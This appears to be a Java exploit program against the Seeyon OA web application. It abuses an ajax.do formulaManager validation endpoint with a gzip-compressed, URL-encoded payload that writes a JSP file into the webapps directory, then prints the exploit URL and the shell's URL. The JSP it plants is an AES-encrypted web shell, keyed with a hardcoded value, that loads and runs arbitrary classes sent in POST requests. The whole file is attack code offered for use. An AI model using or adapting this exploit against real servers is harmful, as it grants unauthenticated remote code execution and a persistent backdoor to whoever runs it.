import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.zip.GZIPOutputStream;

public class SeeyonExp {
    public static void main(String[] args) throws Exception {
        test2();
    }

    public static void test2() throws Exception{
        String host = "";
        String jspName = "seeyon_config.jsp";
        String filepath = "../webapps/seeyon/" + jspName;
        String jspContent = "<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>";
        String b64shell = Base64.getEncoder().encodeToString(jspContent.getBytes(StandardCharsets.UTF_8));
        String source="[{'formulaType': 1, 'formulaName': 'ShanNon', 'formulaExpression': '" +
                "java.io.PrintWriter printWriter2 = new java.io.PrintWriter(\"" + filepath + "\");" +
                "String shell = \"" + b64shell + "\";" +
                "sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();" +
                "String decodeString = new String(decoder.decodeBuffer(shell),\"UTF-8\");" +
                "printWriter2.println(decodeString);" +
                "printWriter2.close();};ShanNon();def static bCcMV(){'}, '', {}, 'true']";

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        GZIPOutputStream gzipOutputStream = new GZIPOutputStream(byteArrayOutputStream);
        gzipOutputStream.write(source.getBytes(StandardCharsets.UTF_8));
        gzipOutputStream.finish();
        String data = host + "/seeyon/ajax.do;Jsessionid=getAjaxDataServlet?method=ajaxAction&managerMethod=validate&managerName=formulaManager&requestCompress=gzip&S=ajaxColManager&M=colDelLock&arguments=" + URLEncoder.encode(new String(byteArrayOutputStream.toByteArray(), "iso-8859-1"));
        System.out.println("URL: " + data);
        System.out.println("jspURL: " + host + "/seeyon/" + jspName + ";Jsessionid=getAjaxDataServlet?S=ajaxColManager&M=colDelLock");
    }

}